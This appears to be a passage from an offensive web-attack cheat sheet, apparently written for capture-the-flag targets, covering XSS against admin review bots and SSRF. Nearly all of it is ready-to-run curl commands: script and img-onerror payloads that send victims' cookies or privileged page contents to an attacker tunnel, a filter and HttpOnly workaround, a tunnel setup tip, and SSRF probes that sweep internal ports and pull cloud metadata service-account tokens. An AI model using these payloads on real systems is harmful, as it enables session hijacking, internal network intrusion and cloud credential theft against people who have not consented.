# XSS-with-bot and SSRF

## H. XSS + admin bot — report / submit-for-review features

Applies when there's an "admin reviews your submission" workflow, a report link, or a contact form.

```bash
# tunnel first — see the note below on ngrok vs cloudflared
/c/Tools/cloudflared.exe tunnel --url http://localhost:8080 &

# basic cookie steal
curl -si -X POST <target>/api/report $AUTH_HEADER -H 'Content-Type: application/json' \
  -d '{"content":"<script>fetch(\"https://<tunnel-url>/?c=\"+document.cookie)</script>"}'

# img onerror (bypasses script-tag filters)
curl -si -X POST <target>/api/report $AUTH_HEADER -H 'Content-Type: application/json' \
  -d '{"content":"<img src=x onerror=\"fetch('"'"'https://<tunnel-url>/?c='"'"'+document.cookie)\">"}'

# exfiltrate a privileged response body (works around HttpOnly)
curl -si -X POST <target>/api/report $AUTH_HEADER -H 'Content-Type: application/json' \
  -d '{"content":"<script>fetch(\"/api/flag\").then(r=>r.text()).then(t=>fetch(\"https://<tunnel-url>/?d=\"+btoa(t)))</script>"}'
```

**Use cloudflared, not ngrok, for anything a real browser loads.** ngrok's free tier serves an interstitial HTML page to browser-like requests unless a custom header is present, and a `<script src>` can't send one — this silently broke a working exploit chain on FurHire-013 while curl tests passed. Reserve ngrok for server-side OOB callbacks (SSRF pings).

Cookie arrives → set it as `$AUTH_HEADER` and re-probe everything.

## I. SSRF — URL or callback params

```bash
# localhost
curl -si -X POST <target>/api/<endpoint> $AUTH_HEADER -H 'Content-Type: application/json' \
  -d '{"url":"http://127.0.0.1/"}'

# internal port sweep
for port in 80 443 8080 8443 3000 3306 5432 6379 9200; do
  echo "=== $port ==="
  curl -si -X POST <target>/api/<endpoint> $AUTH_HEADER -H 'Content-Type: application/json' \
    -d "{\"url\":\"http://127.0.0.1:$port/\"}"
done

# cloud metadata
curl -si -X POST <target>/api/<endpoint> $AUTH_HEADER -H 'Content-Type: application/json' \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}'
curl -si -X POST <target>/api/<endpoint> $AUTH_HEADER -H 'Content-Type: application/json' \
  -d '{"url":"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"}'

# confirm OOB first, before probing internal
curl -si -X POST <target>/api/<endpoint> $AUTH_HEADER -H 'Content-Type: application/json' \
  -d '{"url":"https://<ngrok-url>/ssrf-test"}'
```
